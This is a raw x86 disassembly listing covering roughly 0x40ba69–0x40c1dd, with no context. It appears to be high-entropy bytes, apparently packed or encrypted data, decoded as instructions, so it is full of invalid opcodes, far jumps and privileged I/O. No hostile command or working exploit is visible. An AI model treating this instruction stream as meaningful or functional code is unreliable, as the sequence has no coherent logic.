  40ba69:	in     al,0x3c
  40ba6b:	fmul   QWORD PTR [ecx+0xe]
  40ba6e:	gs adc eax,0x65da7b3c
  40ba74:	inc    esi
  40ba75:	cli    
  40ba76:	int    0x15
  40ba78:	les    esi,FWORD PTR [ecx]
  40ba7a:	sbb    al,0x31
  40ba7c:	lds    eax,FWORD PTR [ebp+0x53]
  40ba7f:	cmp    al,0x8
  40ba81:	mov    esi,0xde894247
  40ba86:	(bad)  
  40ba87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba88:	mov    dh,0x40
  40ba8a:	jmp    0x302c:0xd6e7a601
  40ba91:	mov    edx,0xa6533d28
  40ba96:	or     al,BYTE PTR [edi]
  40ba98:	mov    ch,0x58
  40ba9a:	daa    
  40ba9b:	fld    DWORD PTR [bp+si+0x2257]
  40baa0:	add    BYTE PTR ds:0xc32a74e7,ah
  40baa6:	lds    edx,FWORD PTR [esi-0x68]
  40baa9:	xchg   edx,eax
  40baaa:	mov    bl,0xf4
  40baac:	das    
  40baad:	inc    esp
  40baae:	inc    DWORD PTR [eax]
  40bab0:	cdq    
  40bab1:	pop    ecx
  40bab2:	(bad)  
  40bab3:	xor    esi,ebx
  40bab5:	addr16 mov eax,0x114c98a1
  40babb:	outs   dx,BYTE PTR ds:[esi]
  40babc:	lds    edi,FWORD PTR [edi+0x724c53fa]
  40bac2:	push   es
  40bac3:	ror    ch,0x8f
  40bac6:	xchg   esp,edx
  40bac8:	shr    BYTE PTR [ebp+0x21efe955],cl
  40bace:	dec    esi
  40bacf:	mov    ds:0x21e0cab4,eax
  40bad4:	sbb    al,0xd
  40bad6:	sbb    BYTE PTR [ebx],dh
  40bad8:	mov    ch,BYTE PTR [ebp+0x6cda2899]
  40bade:	sahf   
  40badf:	mov    eax,ds:0x884a6edb
  40bae4:	sub    al,0x29
  40bae6:	mov    edx,0x86c0b821
  40baeb:	mov    ebx,0xea765da3
  40baf0:	jp     0x40bb71
  40baf2:	in     al,0x7a
  40baf4:	sbb    ah,dl
  40baf6:	imul   edi,DWORD PTR [eax+ebp*8+0x2423c8c4],0x2
  40bafe:	jo     0x40baec
  40bb00:	xlat   BYTE PTR ds:[ebx]
  40bb01:	jns    0x40bad4
  40bb03:	sub    al,0xec
  40bb05:	lock mov ebp,0x4dfecd4c
  40bb0b:	stos   DWORD PTR es:[edi],eax
  40bb0c:	iret   
  40bb0d:	dec    ecx
  40bb0e:	in     al,dx
  40bb0f:	mov    cl,0xfc
  40bb11:	push   ebx
  40bb12:	int    0xf6
  40bb14:	(bad)  
  40bb16:	mov    WORD PTR ds:0x640bd96e,fs
  40bb1c:	mov    esi,0x13e55cb
  40bb21:	cmp    ch,bh
  40bb23:	imul   ah
  40bb25:	cmp    DWORD PTR [edi+0x644f4691],0xffffff9c
  40bb2c:	out    0x92,eax
  40bb2e:	xchg   BYTE PTR [esi-0x2d3cb6e0],ch
  40bb34:	adc    al,0x9b
  40bb36:	daa    
  40bb37:	sbb    eax,0xf322efbf
  40bb3c:	mov    bl,0x4c
  40bb3e:	cli    
  40bb3f:	xor    dl,BYTE PTR [eax-0x37]
  40bb42:	xor    ebp,DWORD PTR [esi+eiz*2-0x5c4ca0f]
  40bb49:	sub    al,0xc0
  40bb4b:	xchg   DWORD PTR [esi+0x20e0de38],eax
  40bb51:	sbb    BYTE PTR [ecx+0x23c47dd],cl
  40bb57:	or     ebp,DWORD PTR [ebx+0x11]
  40bb5a:	or     eax,DWORD PTR es:[edx-0x61593210]
  40bb61:	out    dx,al
  40bb62:	ficom  WORD PTR ds:0xba02b192
  40bb68:	push   0xfffffffb
  40bb6a:	cs popf 
  40bb6c:	shr    edi,0x9c
  40bb6f:	(bad)  
  40bb70:	pushf  
  40bb71:	arpl   dx,sp
  40bb73:	push   edi
  40bb74:	or     al,0x41
  40bb76:	and    BYTE PTR [eax],al
  40bb78:	pop    edx
  40bb79:	pop    eax
  40bb7a:	pushf  
  40bb7b:	ja     0x40bb07
  40bb7d:	xchg   edi,eax
  40bb7e:	xchg   DWORD PTR [ecx+ebp*8-0x37],ebp
  40bb82:	clc    
  40bb83:	fstp   QWORD PTR [edx+0x20]
  40bb86:	mov    dl,0xcc
  40bb88:	xchg   ebx,eax
  40bb89:	adc    DWORD PTR [eax+0x347e7e0e],esi
  40bb8f:	dec    edx
  40bb90:	push   es
  40bb91:	sbb    bh,BYTE PTR [edi]
  40bb93:	cs xchg ecx,eax
  40bb95:	aaa    
  40bb96:	cmc    
  40bb97:	jp     0x40bbee
  40bb99:	aas    
  40bb9a:	cmp    cl,BYTE PTR [edx-0x108586d4]
  40bba0:	jns    0x40bbd3
  40bba2:	lods   al,BYTE PTR ds:[esi]
  40bba3:	or     bl,0x81
  40bba6:	lea    ecx,[edi-0x20aa9cae]
  40bbac:	xor    ebx,ebp
  40bbae:	imul   esp,DWORD PTR [edx],0xbc36dc5a
  40bbb4:	aam    0x8d
  40bbb6:	mov    BYTE PTR ds:0x24421acf,0x1f
  40bbbd:	xlat   BYTE PTR ds:[ebx]
  40bbbe:	mov    al,ds:0x771d7d14
  40bbc3:	push   ebp
  40bbc4:	fcomp  DWORD PTR [edi+0x18137468]
  40bbca:	mov    bl,0x35
  40bbcc:	out    0xd5,al
  40bbce:	or     DWORD PTR [edi+ebx*8+0x6f],ecx
  40bbd2:	mov    dh,0x65
  40bbd4:	repz gs ret 0xcd14
  40bbd9:	jo     0x40bba0
  40bbdb:	mov    ds:0x69a77354,eax
  40bbe0:	cmp    eax,0x566fbdc5
  40bbe5:	inc    esp
  40bbe6:	dec    ecx
  40bbe7:	push   eax
  40bbe8:	loop   0x40bc1e
  40bbea:	test   DWORD PTR [esi-0x11],0xdcfcb58b
  40bbf1:	nop
  40bbf2:	int    0x67
  40bbf4:	or     esi,DWORD PTR [ecx+0x5868d9c6]
  40bbfa:	dec    esi
  40bbfb:	jae    0x40bbc3
  40bbfd:	mov    cl,0x7c
  40bbff:	dec    eax
  40bc00:	popa   
  40bc01:	out    dx,al
  40bc02:	pop    ds
  40bc03:	or     esi,DWORD PTR [eax+0x76]
  40bc06:	repnz mov eax,0x90a86beb
  40bc0c:	ins    DWORD PTR es:[edi],dx
  40bc0d:	sub    BYTE PTR [ebp+0x23198054],dl
  40bc13:	fwait
  40bc14:	inc    ebx
  40bc15:	push   esi
  40bc16:	cli    
  40bc17:	add    DWORD PTR ds:0x6261d1c6,ecx
  40bc1d:	lods   al,BYTE PTR ds:[esi]
  40bc1e:	sub    ecx,ecx
  40bc20:	shr    DWORD PTR [ebx+0x774c6a32],cl
  40bc26:	rcl    ch,1
  40bc28:	or     bl,0x4
  40bc2b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc2d:	stos   DWORD PTR es:[edi],eax
  40bc2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc2f:	pop    ebp
  40bc30:	dec    edi
  40bc31:	(bad)  
  40bc32:	cdq    
  40bc33:	cmp    eax,0xcdb7e1d0
  40bc38:	or     DWORD PTR [edi+ebp*8],0xc23c03b5
  40bc3f:	push   0x3c
  40bc41:	xor    esp,DWORD PTR [edx+0x75]
  40bc44:	ss push es
  40bc46:	pop    ebp
  40bc47:	mov    dl,0xea
  40bc49:	add    al,0xe6
  40bc4b:	imul   edi,DWORD PTR [esi-0x21],0xa6f99578
  40bc52:	add    edi,esp
  40bc54:	mov    edi,0xc15ed6ab
  40bc59:	mov    dl,0x7b
  40bc5b:	inc    esi
  40bc5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc5d:	dec    esi
  40bc5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc5f:	jno    0x40bcc8
  40bc61:	pop    ebx
  40bc62:	xor    edi,esp
  40bc64:	or     al,0x6c
  40bc66:	sub    ecx,DWORD PTR [ecx-0x47]
  40bc69:	pusha  
  40bc6a:	sbb    edx,ecx
  40bc6c:	sub    ch,BYTE PTR [edi]
  40bc6e:	sahf   
  40bc6f:	mov    ds:0x9b474bbc,eax
  40bc74:	or     BYTE PTR [edx+0x33],ch
  40bc77:	or     edx,DWORD PTR [eax-0xf]
  40bc7a:	cmp    bh,BYTE PTR [esi]
  40bc7c:	or     eax,0xbb897311
  40bc81:	xor    ecx,DWORD PTR [esi+ebp*1+0x4e]
  40bc85:	mov    ebx,0xcc417094
  40bc8a:	lock repnz (bad) 
  40bc8d:	loop   0x40bcec
  40bc8f:	and    DWORD PTR [esi-0x7f],0xffffff9a
  40bc93:	aas    
  40bc94:	push   ecx
  40bc95:	call   0xe16d:0x1e554f54
  40bc9c:	outs   dx,DWORD PTR ds:[esi]
  40bc9d:	xor    eax,DWORD PTR fs:[edx]
  40bca0:	xchg   ebx,eax
  40bca1:	sub    dh,BYTE PTR [eax+0x42]
  40bca4:	jo     0x40bce7
  40bca6:	or     ebp,ebp
  40bca8:	les    esp,FWORD PTR [edi-0x5c]
  40bcab:	shl    cl,cl
  40bcad:	adc    bl,BYTE PTR [eax+0x79]
  40bcb0:	popa   
  40bcb1:	or     dh,dl
  40bcb3:	jge    0x40bd34
  40bcb5:	dec    edi
  40bcb6:	mov    eax,0xff4fb5ab
  40bcbb:	mov    WORD PTR [ebp+0x26fe7170],ds
  40bcc1:	inc    esp
  40bcc2:	add    eax,0x45bcb145
  40bcc7:	mov    bh,dh
  40bcc9:	pop    ecx
  40bcca:	fsubr  QWORD PTR [eax+esi*1]
  40bccd:	cli    
  40bcce:	cli    
  40bccf:	cmc    
  40bcd0:	ss test eax,0xa6a12f05
  40bcd6:	bound  esi,QWORD PTR [esi+0x35f69dca]
  40bcdc:	dec    esp
  40bcdd:	test   BYTE PTR [ebx],ch
  40bcdf:	inc    esp
  40bce0:	dec    ebp
  40bce1:	aaa    
  40bce2:	mov    esi,0x4d671d6e
  40bce7:	mov    ebx,0x41482883
  40bcec:	ins    BYTE PTR es:[edi],dx
  40bced:	cmp    al,0x76
  40bcef:	in     al,0xd3
  40bcf1:	bnd call 0x151e2f8d
  40bcf7:	pushf  
  40bcf8:	scas   al,BYTE PTR es:[edi]
  40bcf9:	push   edi
  40bcfa:	data16 jg 0x40bd33
  40bcfd:	jae    0x40bcfc
  40bcff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd00:	jmp    0x39bb:0x2538dcd
  40bd07:	cmp    dh,BYTE PTR es:[ebx+eax*2-0x23]
  40bd0c:	mov    esi,ecx
  40bd0e:	mov    ecx,0x8323e301
  40bd13:	inc    eax
  40bd14:	in     al,dx
  40bd15:	leave  
  40bd16:	jle    0x40bd07
  40bd18:	pop    ecx
  40bd19:	sar    BYTE PTR [ebx],cl
  40bd1b:	dec    esp
  40bd1c:	ret    
  40bd1d:	shr    BYTE PTR [ebp+0x3bd1fd2f],0x63
  40bd24:	ins    BYTE PTR es:[edi],dx
  40bd25:	dec    esi
  40bd26:	fimul  WORD PTR [ebx-0x56]
  40bd29:	mov    ebx,0x208c7757
  40bd2e:	adc    edi,ebx
  40bd30:	cmp    esi,DWORD PTR [esp+ebx*4+0x741d5969]
  40bd37:	fwait
  40bd38:	push   0x1
  40bd3a:	dec    eax
  40bd3b:	lods   ax,WORD PTR ds:[esi]
  40bd3d:	cmp    bh,BYTE PTR [eax+0x117703e8]
  40bd43:	or     al,0x63
  40bd45:	ret    
  40bd46:	repz retf 
  40bd48:	adc    DWORD PTR [ebp+ebx*8+0x741b005c],esi
  40bd4f:	jae    0x40bd15
  40bd51:	and    dh,BYTE PTR [ecx]
  40bd53:	pop    edx
  40bd54:	mov    esp,DWORD PTR [ebx]
  40bd56:	push   0xffffffb9
  40bd58:	pop    ss
  40bd59:	sub    al,0xc3
  40bd5b:	test   BYTE PTR [esi],ah
  40bd5d:	jecxz  0x40bda0
  40bd5f:	xchg   edx,eax
  40bd60:	push   esi
  40bd61:	mov    esi,0xaa7e839a
  40bd66:	mov    ebp,0x2f32b0f0
  40bd6b:	into   
  40bd6c:	ins    BYTE PTR es:[edi],dx
  40bd6d:	das    
  40bd6e:	fisttp DWORD PTR [esi]
  40bd70:	and    DWORD PTR [ecx+0x6d],edx
  40bd73:	mov    WORD PTR [edi+edx*4],ss
  40bd76:	iret   
  40bd77:	hlt    
  40bd78:	loop   0x40bd4e
  40bd7a:	inc    edx
  40bd7b:	aas    
  40bd7c:	leave  
  40bd7d:	fwait
  40bd7e:	and    eax,0xfa4cb311
  40bd83:	dec    edx
  40bd84:	jae    0x40bd1d
  40bd86:	mov    al,0xcd
  40bd88:	xchg   esi,eax
  40bd89:	loope  0x40bd85
  40bd8b:	lea    edi,[edx-0x30f3fddc]
  40bd91:	and    ecx,DWORD PTR [eax-0x7f167ef9]
  40bd97:	sbb    eax,0x22991e61
  40bd9c:	mov    edi,0x2934df0d
  40bda1:	dec    ebx
  40bda2:	cmp    eax,0x81492177
  40bda7:	adc    BYTE PTR [esp+eiz*8-0x2d0abb4d],ch
  40bdae:	lds    ebx,FWORD PTR [esi+0x38aea9f1]
  40bdb4:	inc    esp
  40bdb5:	sbb    DWORD PTR [eax],edx
  40bdb7:	arpl   WORD PTR [edi],bx
  40bdb9:	sub    DWORD PTR [edi-0x1e17feb8],esp
  40bdbf:	outs   dx,BYTE PTR ds:[esi]
  40bdc0:	pop    eax
  40bdc1:	jecxz  0x40be18
  40bdc3:	pop    ds
  40bdc4:	mov    edx,0x34b2c6ba
  40bdc9:	xchg   ebx,eax
  40bdca:	loopne 0x40bdab
  40bdcc:	out    dx,al
  40bdcd:	pop    edi
  40bdce:	or     eax,0x7835c203
  40bdd3:	jae    0x40bd59
  40bdd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdd6:	or     eax,0xb0a87a44
  40bddb:	mov    bl,bh
  40bddd:	daa    
  40bdde:	dec    esp
  40bddf:	push   esp
  40bde0:	stc    
  40bde1:	xor    ch,0x24
  40bde4:	lods   eax,DWORD PTR ds:[esi]
  40bde5:	imul   DWORD PTR [ecx+edx*2+0x41ecd488]
  40bdec:	call   0x39fe69f
  40bdf1:	dec    ecx
  40bdf2:	sub    eax,DWORD PTR [esi-0x3b8ebd44]
  40bdf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdf9:	icebp  
  40bdfa:	je     0x40be6b
  40bdfc:	(bad)  
  40bdfd:	lds    esp,FWORD PTR [edx+0x28cc6de7]
  40be03:	stc    
  40be04:	cmp    eax,0xcb3ac041
  40be09:	jle    0x40be5e
  40be0b:	mov    eax,ds:0x63314fff
  40be10:	inc    ah
  40be12:	(bad)  
  40be13:	mov    dl,0xe3
  40be15:	cmp    bh,ch
  40be17:	pop    esp
  40be18:	pop    es
  40be19:	sub    bl,cl
  40be1b:	fiadd  DWORD PTR [ecx]
  40be1d:	sub    bl,BYTE PTR [eax+0x1f]
  40be20:	or     BYTE PTR [edi-0x690b9636],al
  40be26:	stos   BYTE PTR es:[edi],al
  40be27:	ret    
  40be28:	jns    0x40bdcf
  40be2a:	ret    0x5064
  40be2d:	icebp  
  40be2e:	cdq    
  40be2f:	outs   dx,BYTE PTR ds:[esi]
  40be30:	adc    eax,0x9f525e58
  40be35:	pop    ss
  40be36:	pop    ds
  40be37:	xor    al,0x5
  40be39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be3a:	ret    
  40be3b:	pop    ebx
  40be3c:	mov    ch,0x39
  40be3e:	xlat   BYTE PTR ds:[ebx]
  40be3f:	mov    dl,0x1e
  40be41:	imul   edi,DWORD PTR [edx-0x35],0xeb87ed3
  40be48:	out    0x5e,eax
  40be4a:	sub    dl,dh
  40be4c:	sbb    ecx,esp
  40be4e:	mov    BYTE PTR [eax+0x68],dh
  40be51:	ret    0x361f
  40be54:	js     0x40be30
  40be56:	cmp    BYTE PTR [edx+0x2d1d02a9],0xb3
  40be5d:	sbb    DWORD PTR [edx+0x48],esi
  40be60:	lods   al,BYTE PTR ds:[esi]
  40be61:	cmp    ch,dl
  40be63:	sbb    al,ah
  40be65:	dec    ecx
  40be66:	jmp    0x5644:0xa890b162
  40be6d:	mov    bl,0x82
  40be6f:	push   di
  40be71:	popf   
  40be72:	sub    ebx,DWORD PTR [esi]
  40be74:	int3   
  40be75:	aad    0x18
  40be77:	inc    eax
  40be78:	loope  0x40beb4
  40be7a:	adc    BYTE PTR [edx],cl
  40be7c:	cmp    BYTE PTR [ebp-0x41],cl
  40be7f:	inc    edi
  40be80:	mov    edx,0x3239cf41
  40be85:	daa    
  40be86:	fcmovnu st,st(1)
  40be88:	xlat   BYTE PTR ds:[ebx]
  40be89:	stc    
  40be8a:	or     eax,0x4e3618f4
  40be8f:	or     dl,BYTE PTR [edi]
  40be91:	adc    al,0xd4
  40be93:	jmp    0xb026:0x387fbd66
  40be9a:	sub    esi,DWORD PTR [ebp-0xbf0e8e7]
  40bea0:	jle    0x40be43
  40bea2:	and    ch,BYTE PTR [edx]
  40bea4:	fild   DWORD PTR [esi-0x5c4007cc]
  40beaa:	bound  edi,QWORD PTR [ecx]
  40beac:	pop    edi
  40bead:	or     DWORD PTR [edx+0x75abed04],ebp
  40beb3:	cli    
  40beb4:	or     ah,al
  40beb6:	sbb    DWORD PTR [ebx-0x64],eax
  40beb9:	lds    edi,FWORD PTR [edi+eiz*1]
  40bebc:	in     eax,dx
  40bebd:	adc    eax,0x5f4363e6
  40bec2:	(bad)  
  40bec3:	adc    DWORD PTR [ebx-0x46e1cd47],ebx
  40bec9:	mov    edi,0x7e00d69d
  40bece:	lds    esp,FWORD PTR [ebx+ebp*1]
  40bed1:	mov    ebx,0x5c31de50
  40bed6:	cmp    eax,0xa8a82d2b
  40bedb:	call   0xe4e5:0xc9399c62
  40bee2:	dec    ecx
  40bee3:	ret    0xe9f4
  40bee6:	gs je  0x40bef3
  40bee9:	test   DWORD PTR [esi],esi
  40beeb:	push   0x3a2f38cf
  40bef0:	adc    BYTE PTR [edx-0xe0c3271],dl
  40bef6:	adc    eax,0x9ff09e95
  40befb:	pop    ss
  40befc:	dec    edi
  40befd:	dec    esp
  40befe:	mov    cs,WORD PTR [eax+0x6c282712]
  40bf04:	xchg   DWORD PTR [ecx],edx
  40bf06:	ins    DWORD PTR es:[edi],dx
  40bf07:	cmp    eax,0x65525bca
  40bf0c:	and    eax,0x74098db3
  40bf11:	stc    
  40bf12:	dec    esp
  40bf13:	(bad)  
  40bf14:	test   dl,0x64
  40bf17:	xor    eax,0xdd9b8c51
  40bf1c:	bound  esi,QWORD PTR [eax+ebx*4-0x6543afac]
  40bf23:	jno    0x40bf96
  40bf25:	fidiv  DWORD PTR [ecx+0x41955304]
  40bf2b:	sub    dl,BYTE PTR [ecx-0x56185699]
  40bf31:	sbb    BYTE PTR [ecx+0xe],bl
  40bf34:	inc    edx
  40bf35:	or     BYTE PTR [ebx+eax*4],dl
  40bf38:	cmp    DWORD PTR [eax+0x2c],0xaab2a202
  40bf3f:	push   eax
  40bf40:	sub    eax,0x249f7d2c
  40bf45:	std    
  40bf46:	jbe    0x40bed2
  40bf48:	jns    0x40bfc3
  40bf4a:	sub    dl,dh
  40bf4c:	mov    dh,0x4
  40bf4e:	inc    ebp
  40bf50:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40bf52:	popa   
  40bf53:	mov    ds:0xbf8d9653,eax
  40bf58:	mov    eax,0x5f6bf085
  40bf5d:	out    dx,al
  40bf5e:	addr16 inc ecx
  40bf60:	outs   dx,DWORD PTR es:[esi]
  40bf62:	cld    
  40bf63:	cmp    DWORD PTR [bx+si-0x585c],esp
  40bf68:	xchg   ebx,eax
  40bf69:	or     DWORD PTR [eax+0x5],0xfffffff2
  40bf6d:	mov    edx,0x47537f7c
  40bf72:	add    ecx,esp
  40bf74:	clc    
  40bf75:	xchg   edi,eax
  40bf76:	and    cl,BYTE PTR [eax+eiz*4-0x2c]
  40bf7a:	add    DWORD PTR [ebp+0x52d57160],ecx
  40bf80:	inc    edi
  40bf81:	cmp    esp,DWORD PTR [eax+eax*8-0xd]
  40bf85:	scas   al,BYTE PTR es:[edi]
  40bf86:	dec    esi
  40bf87:	lock nop
  40bf89:	ins    BYTE PTR es:[edi],dx
  40bf8a:	adc    DWORD PTR [edx],esp
  40bf8c:	sbb    BYTE PTR [esi],bl
  40bf8e:	fiadd  WORD PTR ds:[eax+0x56142566]
  40bf95:	shr    DWORD PTR [eax+0x26],cl
  40bf98:	shl    DWORD PTR [ebx-0x31782b39],1
  40bf9e:	mov    ebp,0xb76b9bf0
  40bfa3:	adc    DWORD PTR [ecx+ebp*8+0x593bc6d5],edx
  40bfaa:	and    edx,DWORD PTR [eax-0x66baaf75]
  40bfb0:	xchg   ecx,eax
  40bfb1:	outs   dx,BYTE PTR ds:[esi]
  40bfb2:	call   0x119d:0xe3759327
  40bfb9:	imul   eax,DWORD PTR ds:0x926ea7fa,0x48
  40bfc0:	mov    esp,0xac6caf68
  40bfc5:	sar    DWORD PTR [edx+0x1a],1
  40bfc8:	lods   al,BYTE PTR ds:[esi]
  40bfc9:	fist   DWORD PTR [esi+0x46]
  40bfcc:	jecxz  0x40c042
  40bfce:	inc    ecx
  40bfcf:	mov    DWORD PTR [ebp+0x5198a880],ebp
  40bfd5:	mov    ch,0xc1
  40bfd7:	mov    esi,0x25d2f594
  40bfdc:	pop    eax
  40bfdd:	xchg   ebp,eax
  40bfde:	mov    ?,WORD PTR [edx]
  40bfe0:	sbb    DWORD PTR [edx+0x23],0x109c93b
  40bfe7:	mov    ecx,DWORD PTR [ecx]
  40bfe9:	mov    al,ch
  40bfeb:	in     eax,dx
  40bfec:	mov    esi,0x7df3299
  40bff1:	or     edi,0x69
  40bff4:	jl     0x40bffb
  40bff6:	cs iret 
  40bff8:	cmp    bh,dh
  40bffa:	(bad)  
  40bffb:	aad    0x1b
  40bffd:	sub    al,0xbb
  40bfff:	sti    
  40c000:	ins    DWORD PTR es:[edi],dx
  40c001:	bswap  esi
  40c003:	call   ebx
  40c005:	jg     0x40bf8e
  40c007:	xor    esi,eax
  40c009:	xor    BYTE PTR [ebp+0x64],ah
  40c00c:	dec    ebp
  40c00d:	pushf  
  40c00e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c00f:	scas   al,BYTE PTR es:[edi]
  40c010:	sub    al,0x22
  40c012:	enter  0xdabf,0x44
  40c016:	nop
  40c017:	stc    
  40c018:	jg     0x40bfd5
  40c01a:	sub    eax,ebp
  40c01c:	mov    ds,WORD PTR [ebx+0x62]
  40c01f:	inc    ebx
  40c020:	out    dx,al
  40c021:	in     al,0x2a
  40c023:	and    eax,0x26292524
  40c028:	mov    DWORD PTR [ebp+0x67],edi
  40c02b:	or     dh,BYTE PTR [edx]
  40c02d:	inc    ebx
  40c02e:	adc    ah,ch
  40c030:	pop    es
  40c031:	mov    ecx,0xb26e9d20
  40c036:	ins    DWORD PTR es:[edi],dx
  40c037:	ja     0x40bfc5
  40c039:	sub    eax,esp
  40c03b:	mov    ah,BYTE PTR [edx+0x54]
  40c03e:	stos   BYTE PTR es:[edi],al
  40c03f:	loope  0x40bfd7
  40c041:	mov    cl,ch
  40c043:	cmp    BYTE PTR [esi],bh
  40c045:	hlt    
  40c046:	push   esi
  40c047:	pusha  
  40c048:	(bad)  
  40c049:	fistp  QWORD PTR [ebp+0x4e]
  40c04c:	jg     0x40c04f
  40c04e:	scas   eax,DWORD PTR es:[edi]
  40c04f:	int    0x8
  40c051:	ret    
  40c052:	cmp    BYTE PTR [edx],dl
  40c054:	sbb    bh,BYTE PTR [ecx]
  40c056:	mov    bh,BYTE PTR [edx+0x26]
  40c059:	(bad)  
  40c05a:	out    dx,eax
  40c05b:	(bad)  
  40c05c:	adc    al,0x57
  40c05e:	pop    ss
  40c05f:	and    al,0xf3
  40c061:	ficomp DWORD PTR [esp+edx*8-0x30]
  40c065:	mov    edi,0x7835bd62
  40c06a:	stos   DWORD PTR es:[edi],eax
  40c06b:	retf   
  40c06c:	and    al,0x4a
  40c06e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c06f:	xor    al,0x2
  40c071:	or     dl,al
  40c073:	add    eax,0x88578a78
  40c078:	cmp    edx,ebx
  40c07a:	pop    edx
  40c07b:	pop    esi
  40c07c:	jmp    0xa94b:0x5ddd94cb
  40c083:	cmp    eax,esi
  40c085:	jbe    0x40c022
  40c087:	jo     0x40c05e
  40c089:	(bad)  
  40c08b:	xchg   edi,eax
  40c08c:	leave  
  40c08d:	push   ss
  40c08e:	enter  0xf5ab,0xb5
  40c092:	mov    ebp,0x785df904
  40c097:	repnz out 0xfa,eax
  40c09a:	cli    
  40c09b:	jmp    0x40c027
  40c09d:	arpl   WORD PTR [edi+0x5],ax
  40c0a0:	sub    BYTE PTR [ebp+0x16d5ef95],ch
  40c0a6:	popf   
  40c0a7:	loopne 0x40c0b9
  40c0a9:	mov    esi,0x8907e08a
  40c0ae:	mov    ds:0x8f988e7a,al
  40c0b3:	loope  0x40c09a
  40c0b5:	or     edi,DWORD PTR [ecx-0x1bbf8bd2]
  40c0bb:	loop   0x40c06d
  40c0bd:	(bad)  
  40c0be:	mov    WORD PTR [ebx],gs
  40c0c0:	mov    esi,0x4eca2014
  40c0c5:	jmp    0xf93a:0x86fe95cb
  40c0cc:	scas   eax,DWORD PTR es:[edi]
  40c0cd:	lds    ebp,FWORD PTR [ebp-0x22]
  40c0d0:	xchg   ebp,eax
  40c0d1:	jp     0x40c0e4
  40c0d3:	mov    ds:0xcfc306db,eax
  40c0d8:	jle    0x40c0e2
  40c0da:	aam    0x69
  40c0dc:	push   ebx
  40c0dd:	in     eax,0xc0
  40c0df:	mov    bh,0x8e
  40c0e1:	test   DWORD PTR [ebp-0xe164645],0xf722cc4c
  40c0eb:	jmp    0x34cc:0x62dc58fc
  40c0f2:	adc    DWORD PTR [ebx-0x463b06b0],ecx
  40c0f8:	clc    
  40c0f9:	and    BYTE PTR [esi-0x16ea551d],cl
  40c0ff:	pop    ecx
  40c100:	pop    edi
  40c101:	adc    DWORD PTR [esi],0xffffffcb
  40c104:	ds xchg ebx,eax
  40c106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c107:	test   eax,0xaa09fb59
  40c10c:	enter  0x662e,0xf6
  40c110:	retf   0x7b10
  40c113:	ja     0x40c12d
  40c115:	int    0xd3
  40c117:	stos   BYTE PTR es:[edi],al
  40c118:	mov    ah,0x3
  40c11a:	dec    ebx
  40c11b:	outs   dx,BYTE PTR ds:[esi]
  40c11c:	adc    eax,0xe4cc1770
  40c121:	sahf   
  40c122:	call   0xefef:0x7cd57d8b
  40c129:	lods   eax,DWORD PTR ds:[esi]
  40c12a:	add    eax,0x23
  40c12d:	mov    esi,0x7180ceb3
  40c132:	enter  0xc9f6,0x22
  40c136:	mov    ebp,0xe899b37b
  40c13b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c13c:	ins    DWORD PTR es:[edi],dx
  40c13d:	xchg   edx,eax
  40c13e:	sbb    BYTE PTR [edi+0x1b],dh
  40c141:	outs   dx,DWORD PTR ds:[esi]
  40c142:	dec    edi
  40c143:	cmp    ebx,ebp
  40c145:	ficom  WORD PTR [ebp-0x1c8be70a]
  40c14b:	mov    edi,0xefcaf95d
  40c150:	mov    ds:0xdace5155,al
  40c155:	pop    ss
  40c156:	cli    
  40c157:	mov    edi,0x5e205796
  40c15c:	into   
  40c15d:	sub    DWORD PTR [ebp+0x20ddfebf],0xbbb63d46
  40c167:	adc    esp,esp
  40c169:	es jno 0x40c1a6
  40c16c:	shr    al,cl
  40c16e:	sub    DWORD PTR [esi+0x45e9d2f7],edx
  40c174:	push   edi
  40c175:	dec    ecx
  40c176:	pop    ebx
  40c177:	lods   eax,DWORD PTR ds:[esi]
  40c178:	lods   al,BYTE PTR ds:[esi]
  40c179:	push   esp
  40c17a:	xchg   ebx,eax
  40c17b:	int3   
  40c17c:	jecxz  0x40c18e
  40c17e:	fstp   TBYTE PTR [edx+eax*4-0x66f35a8f]
  40c185:	push   ebx
  40c186:	push   esp
  40c187:	inc    ebx
  40c188:	stc    
  40c189:	pop    ds
  40c18a:	cmc    
  40c18b:	lods   al,BYTE PTR ds:[si]
  40c18d:	adc    ecx,esi
  40c18f:	aam    0x5f
  40c191:	shl    DWORD PTR [eax+eax*4+0x1],1
  40c195:	push   esi
  40c196:	das    
  40c197:	aad    0x7e
  40c199:	dec    ebp
  40c19a:	lea    ecx,[eax-0x22]
  40c19d:	fmul   DWORD PTR [edi-0x41da5871]
  40c1a3:	cmp    DWORD PTR [edx],edx
  40c1a5:	das    
  40c1a6:	stc    
  40c1a7:	popa   
  40c1a8:	dec    eax
  40c1a9:	jle    0x40c222
  40c1ab:	mov    al,0x7c
  40c1ad:	xor    BYTE PTR [ecx],al
  40c1af:	and    ebp,DWORD PTR [ebp-0x38fc3b67]
  40c1b5:	adc    bh,ah
  40c1b7:	mov    WORD PTR [edx],fs
  40c1b9:	or     esp,DWORD PTR [eax-0x35]
  40c1bc:	(bad)  
  40c1bd:	xor    esi,DWORD PTR [edi]
  40c1bf:	add    bl,BYTE PTR [ebx-0x47]
  40c1c2:	arpl   WORD PTR [eax],si
  40c1c4:	sti    
  40c1c5:	mov    edx,0x5a9b4731
  40c1ca:	jnp    0x40c1f5
  40c1cc:	xchg   ecx,eax
  40c1cd:	xor    al,0xa
  40c1cf:	popa   
  40c1d0:	xor    BYTE PTR [edi],0xef
  40c1d3:	inc    ecx
  40c1d4:	sar    DWORD PTR [eax-0x4a],1
  40c1d7:	cmc    
  40c1d8:	ror    BYTE PTR [ecx+edi*8],cl
  40c1db:	rol    BYTE PTR [edi],1
  40c1dd:	and    ecx,DWORD PTR [edx-0x2fc15265]
